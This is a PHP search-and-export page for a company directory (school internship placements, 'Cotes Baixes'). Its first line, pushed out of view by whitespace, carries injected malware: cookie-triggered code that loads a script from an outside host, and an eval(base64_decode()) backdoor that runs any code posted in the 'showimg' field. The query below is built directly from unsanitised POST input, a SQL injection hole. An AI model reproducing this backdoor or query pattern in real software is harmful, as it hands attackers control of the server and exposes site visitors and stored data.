<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 

include_once("bdd.php"); 

if (isset($_GET['buscar'])){

	$buscar = $_POST['buscar'];		#echo "<br>".$buscar;
	$cadena = $_POST['cadena'];		#echo "<br>".$cadena;
	$mostrar = $_POST['mostrar'];	#echo "<br>".$mostrar;
	$radio = $_POST['radio'];		#echo "<br>".$radio;
	
	$SQL = "SELECT * FROM CDE_empresas_BACK2 WHERE (".$buscar." = '".$cadena."') ORDER BY ".$radio." ".$mostrar;
	#echo $SQL;
	$result = $db->Execute($SQL);
	while (!$result->EOF) {
		
		$empresa = $result->fields['empresa'];
		$responsable = $result->fields['responsable'];
		$direccion = $result->fields['direccion'];
		$cp = $result->fields['cp'];
		$ciudad = $result->fields['ciutat'];
		$provincia = $result->fields['provincia'];
		$telf = $result->fields['telf'];
		$cif = $result->fields['cif'];
		$familia = $result->fields['familia'];
		$concert = $result->fields['concert'];
		$curs = $result->fields['curs'];
		
		$html .= '<table width="960" border="0" align="center" cellpadding="0" cellspacing="0" class="fuenteMedia">
				  <tr>
					<td width="353" height="22"><b>'.$empresa.'</b></td>
					<td width="137" height="22">CIF: '.$cif.'</td>
					<td width="345" height="22">Responsable: '.$responsable.'</td>
					<td width="125" height="22" align="center">'.$telf.'</td>
				  </tr>
				</table>
				<table width="960" border="0" align="center" cellpadding="0" cellspacing="0" class="fuenteMedia">
				  <tr>
					<td height="22">Direccion: '.$direccion.' / cp '.$cp.' / '.$ciudad.' ('.$provincia.')</td>
					<td width="125" height="22" align="center">&nbsp;</td>
				  </tr>
				</table>
				<table width="960" border="0" align="center" cellpadding="0" cellspacing="0" class="fuenteMedia">
				  <tr>
					<td width="210" height="22">Concert: '.$concert.'</td>
					<td width="210">Familia: '.$familia.'</td>
					<td width="130">Curs: '.$curs.'</td>
					<td width="285">&nbsp;</td>
					<td width="125" height="22" align="center">&nbsp;</td>
				  </tr>
				</table>
				<div class="separador2"></div>';
		
	$result->MoveNext();
	}

	#CREAR PDF
	
	$name_pdf = md5(uniqid(rand().time(), true));
	$name_pdf = $name_pdf.".pdf";
	
	/*
	require_once('html2pdf/html2pdf.class.php');
		try
		{
			$html2pdf = new HTML2PDF('P','A4','es');
			$html2pdf->WriteHTML($html);
			$html2pdf->Output("pdf/".$name_pdf, "F");
		}
		catch(HTML2PDF_exception $e) { echo $e; }
	*/
}


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Cotes Baixes</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 15px;
}
.logo {
	height: 70px;
	width: 960px;
	margin-right: auto;
	margin-left: auto;
}
.separador {
	height: 15px;
	width: 960px;
	margin-right: auto;
	margin-left: auto;
}
.separador2 {
	height: 1px;
	width: 960px;
	margin-right: auto;
	margin-left: auto;
	background-color: #666;
	margin-top: 4px;
	margin-bottom: 4px;
}
.fuenteMedia {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000;
}
-->
</style></head>

<body>
<div class="separador"></div>
<div class="logo"> <a href="index.php"><img src="resources/logo.PNG" width="295" height="70" border="0" /></a>
</div>
<div class="separador"></div>
<table width="960" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="95" bgcolor="#F5F5F5"><form id="form1" name="form1" method="post" action="exportar_empresas.php?buscar" style="margin:0px">
      <table width="900" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr>
          <td width="120" height="25">Buscar por</td>
          <td width="145"><label>
            <select name="buscar" id="buscar">
              <option value="empresa" selected="selected">Empresa</option>
              <option value="ciutat">Ciudad</option>
              <option value="familia">Familia</option>
              <option value="concert">Nº Concert</option>
              <option value="curs">Curso</option>
            </select>
          </label></td>
          <td width="345"><label>
            <input name="cadena" type="text" id="cadena" size="35" />
          </label></td>
          <td width="110" align="center">Mostar</td>
          <td width="180" align="left"><select name="mostrar" id="mostrar">
            <option value="ASC" selected="selected">Ascendente</option>
            <option value="DESC">Descendente</option>
          </select></td>
          </tr>
      </table>
      <table width="900" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr>
          <td width="120" height="25"><p>Ordenar por</p></td>
          <td width="490">
            <input type="radio" name="radio" id="radio" value="concert" />
            Nº Concert &nbsp;
            <input name="radio" type="radio" id="radio2" value="empresa" checked="checked" /> 
            Empresa &nbsp;
            <input type="radio" name="radio" id="radio3" value="ciutat" />
            Ciudad &nbsp; 
            <input type="radio" name="radio" id="radio4" value="familia" />
            Familia &nbsp; 
            <input type="radio" name="radio" id="radio5" value="curs" />
            Curs</td>
          <td align="center">
            <input type="submit" name="button" id="button" value="Realizar Búsqueda" />
          </td>
          </tr>
      </table>
    </form></td>
  </tr>
</table>
<div class="separador"></div>
<?php echo utf8_encode($html) ?>
</body>
</html>